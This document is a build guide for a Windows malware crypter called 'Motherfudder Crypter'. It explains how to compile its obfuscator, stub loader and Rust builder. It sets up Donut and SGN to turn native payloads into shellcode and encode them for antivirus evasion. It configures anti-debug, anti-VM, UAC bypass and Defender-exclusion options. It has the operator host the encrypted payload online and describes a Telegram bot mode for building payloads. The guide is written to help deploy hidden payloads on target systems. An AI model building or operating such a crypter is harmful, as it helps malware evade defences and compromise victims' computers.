# Build Guide

Comprehensive guide for building Motherfudder Crypter from source.

---

## Table of Contents

1. [Prerequisites•(#prerequisites)
2. [Building Core Components•(#building-core-components)
3. [Native Payload Requirements•(#native-payload-requirements)
4. [Deployment Structure•(#deployment-structure)
5. [Building Process•(#building-process)
6. [Verification•(#verification)
7. [Troubleshooting•(#troubleshooting)

---

## Prerequisites

### Required Software

#### Core Requirements
- **Visual Studio** (2019 or later)
  - .NET Framework 4.8 development tools
  - C# compiler
  - MSBuild

- **Rust Toolchain** (1.70.0 or later)
  - rustc
  - cargo
  - rustfmt (recommended)

#### Operating System
- Windows 10/11 (for building)
- Linux/macOS (for bot-only builds)

### Optional Tools (Native Payloads Only)

Required only for native (non-.NET) payload crypting:

- **Donut** - PE to shellcode converter
  - Repository: https://github.com/TheWover/donut
  - Purpose: Converts native PE to position-independent shellcode

- **SGN** - Shellcode encoder
  - Repository: https://github.com/EgeBalci/sgn
  - Purpose: Encodes shellcode for evasion
  - Dependency: `keystone.dll`

**Note**: .NET payloads do NOT require Donut or SGN.

---

## Building Core Components

### Step 1: Build .NET Obfuscator

1. Navigate to obfuscator directory:
```cmd
cd MfObfDotNet
```

2. Open in Visual Studio:
```cmd
MfObfDotNet.sln
```

3. Build in Release mode:
   - Select "Release" configuration
   - Build > Build Solution (Ctrl+Shift+B)

4. Locate output:
```
MfObfDotNet\bin\Release\MfObfDotNet.exe
```

### Step 2: Build C# Stub

1. Navigate to stub directory:
```cmd
cd MfBuilder\MfRunner
```

2. Open in Visual Studio:
```cmd
MfRunner.sln
```

3. Build in Release mode:
   - Select "Release" configuration
   - Build > Build Solution (Ctrl+Shift+B)

4. Locate output:
```
MfBuilder\MfRunner\bin\Release\MfRunner.exe
```

### Step 3: Build Rust Builder

1. Navigate to builder directory:
```cmd
cd MfBuilder
```

2. Build in release mode:
```cmd
cargo build --release
```

3. Locate output:
```
MfBuilder\target\release\MfBuilder.exe
```

---

## Native Payload Requirements

### Installing Donut

1. Download from: https://github.com/TheWover/donut/releases
2. Extract `donut.exe`
3. Place in deployment directory

Or build from source:
```cmd
git clone https://github.com/TheWover/donut.git
cd donut
make
```

### Installing SGN

1. Download from: https://github.com/EgeBalci/sgn/releases
2. Extract `sgn.exe` and `keystone.dll`
3. Place both files in deployment directory

Or build from source:
```cmd
git clone https://github.com/EgeBalci/sgn.git
cd sgn
go build
```

---

## Deployment Structure

### Directory Layout

Create deployment directory with the following structure:

```
MfBuilder-Deploy/
• MfBuilder.exe              # Main builder (from cargo build)
• MfObfDotNet.exe           # .NET obfuscator (from VS build)
• MfRunner.exe              # C# stub (from VS build)
• build.json                # Configuration file
• payload.exe               # Target binary to crypt
•
• [Native Payload Tools - Optional•
    • donut.exe
    • sgn.exe
    • keystone.dll
```

### Required Files

#### Always Required
- `MfBuilder.exe` - Main builder executable
- `MfObfDotNet.exe` - .NET obfuscator
- `MfRunner.exe` - Stub loader
- `build.json` - Configuration
- `payload.exe` - Target binary

#### Required for Native Payloads
- `donut.exe` - PE to shellcode converter
- `sgn.exe` - Shellcode encoder
- `keystone.dll` - SGN dependency

#### Not Required for .NET Payloads
Donut and SGN are not needed when crypting .NET assemblies.

---

## Building Process

### CLI Mode Build

1. **Prepare deployment directory**:
```cmd
mkdir MfBuilder-Deploy
cd MfBuilder-Deploy
```

2. **Copy required files**:
```cmd
copy ..\MfBuilder\target\release\MfBuilder.exe .
copy ..\MfObfDotNet\bin\Release\MfObfDotNet.exe .
copy ..\MfBuilder\MfRunner\bin\Release\MfRunner.exe .
copy ..\MfBuilder\build.json .
```

3. **Add target payload**:
```cmd
copy C:\path\to\target.exe payload.exe
```

4. **Configure build.json**:
```json
{
    "file_extension": "BAT",
    "anti_debug": true,
    "anti_virtual_machine": true,
    "blacklist_cis_countries": false,
    "uac_bypass": true,
    "single_instance": true,
    "run_on_startup": false,
    "defender_exclusion": true,
    "binder": false
}
```

5. **Execute build**:
```cmd
MfBuilder.exe
```

6. **Upload encrypted payload**:
   - Build process will prompt for encrypted payload URL
   - Upload `encrypted_payload.bin` to file hosting service
   - Provide download URL when prompted

7. **Retrieve output**:
   - Output file: `out.bat` or `out.exe`

### Bot Mode Build

1. **Configure bot** (one-time setup):
```cmd
copy .env.example .env
notepad .env  # Add TELOXIDE_TOKEN
```

2. **Start bot**:
```cmd
MfBuilder.exe --bot
```

3. **Use via Telegram**:
   - Send `/start` to bot
   - Authenticate
   - Upload binary
   - Configure options
   - Receive output

---

## Verification

### Verify Build Components

```cmd
# Check MfBuilder
MfBuilder.exe --version

# Check .NET assemblies exist
dir MfObfDotNet.exe
dir MfRunner.exe

# For native payloads, check tools
dir donut.exe
dir sgn.exe
dir keystone.dll
```

### Test Build

**Test .NET Payload**:
```cmd
# Use simple .NET executable
copy C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe payload.exe
MfBuilder.exe
```

**Test Native Payload**:
```cmd
# Ensure donut and sgn are present
copy C:\Windows\System32\calc.exe payload.exe
MfBuilder.exe
```

---

## Troubleshooting

### Build Failures

#### "MSBuild not found"
**Solution**:
- Install Visual Studio with .NET development tools
- Add MSBuild to PATH
- Default location: `C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\MSBuild\Current\Bin`

#### "cargo: command not found"
**Solution**:
```cmd
# Install Rust from https://rustup.rs/
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
```

#### ".NET Framework 4.8 not found"
**Solution**:
- Download from: https://dotnet.microsoft.com/download/dotnet-framework/net48
- Install and restart Visual Studio

### Runtime Errors

#### "donut.exe not found"
**Cause**: Native payload build without Donut installed

**Solution**:
- Install Donut (see Native Payload Requirements)
- Or crypt .NET payload instead (doesn't need Donut)

#### "sgn.exe not found"
**Cause**: Native payload build without SGN installed

**Solution**:
- Install SGN and keystone.dll
- Or crypt .NET payload instead

#### "keystone.dll not found"
**Cause**: SGN dependency missing

**Solution**:
- Download keystone.dll from SGN release
- Place in same directory as sgn.exe

### Configuration Issues

#### Invalid build.json
**Symptoms**: Parser errors or invalid configuration

**Solution**:
```json
{
    "file_extension": "BAT",
    "anti_debug": true,
    "anti_virtual_machine": true,
    "blacklist_cis_countries": false,
    "uac_bypass": false,
    "single_instance": true,
    "run_on_startup": false,
    "defender_exclusion": false,
    "binder": false
}
```

Ensure:
- Valid JSON syntax
- Correct boolean values (true/false)
- Supported file_extension ("BAT" or "EXE")

---

## Advanced Build Options

### Custom MSBuild Path

If MSBuild is in non-standard location:

```cmd
set MSBUILD_PATH=C:\Custom\Path\To\MSBuild.exe
MfBuilder.exe
```

### Debug Builds

For development/testing:

```cmd
# Rust debug build (faster compilation)
cargo build

# Visual Studio debug builds
# Select "Debug" configuration in VS
```

### Parallel Builds

Speed up Rust compilation:

```cmd
cargo build --release --jobs 8
```

---

## Deployment Checklist

Before deploying built crypter:

- [ • All components built successfully
- [ • MfBuilder.exe tested with sample payload
- [ • Configuration validated
- [ • Native tools installed (if needed)
- [ • Bot token configured (if using bot mode)
- [ • Authentication key changed from default
- [ • .env file not committed to repository
- [ • Output tested on target system

---

## Build Automation

### Batch Script Example

Create `build-all.bat`:

```batch
@echo off
echo Building Motherfudder Crypter Components...

echo.
echo [1/3• Building .NET Obfuscator...
cd MfObfDotNet
msbuild MfObfDotNet.sln /p:Configuration=Release /v:quiet
if errorlevel 1 goto :error

echo.
echo [2/3• Building C# Stub...
cd ..\MfBuilder\MfRunner
msbuild MfRunner.sln /p:Configuration=Release /v:quiet
if errorlevel 1 goto :error

echo.
echo [3/3• Building Rust Builder...
cd ..
cargo build --release --quiet
if errorlevel 1 goto :error

echo.
echo Build completed successfully!
echo.
echo Outputs:
echo - MfObfDotNet: MfObfDotNet\bin\Release\MfObfDotNet.exe
echo - MfRunner: MfBuilder\MfRunner\bin\Release\MfRunner.exe
echo - MfBuilder: MfBuilder\target\release\MfBuilder.exe
goto :end

:error
echo.
echo Build failed! Check error messages above.
exit /b 1

:end
```

---

## See Also

- [INSTALLATION.md•(MfBuilder/INSTALLATION.md) - Installation guide
- [QUICKSTART.md•(MfBuilder/QUICKSTART.md) - Usage guide
- [README.md•(README.md) - Project overview
- [CONTRIBUTING.md•(CONTRIBUTING.md) - Development guidelines

---

**For detailed usage instructions after building, see QUICKSTART.md**
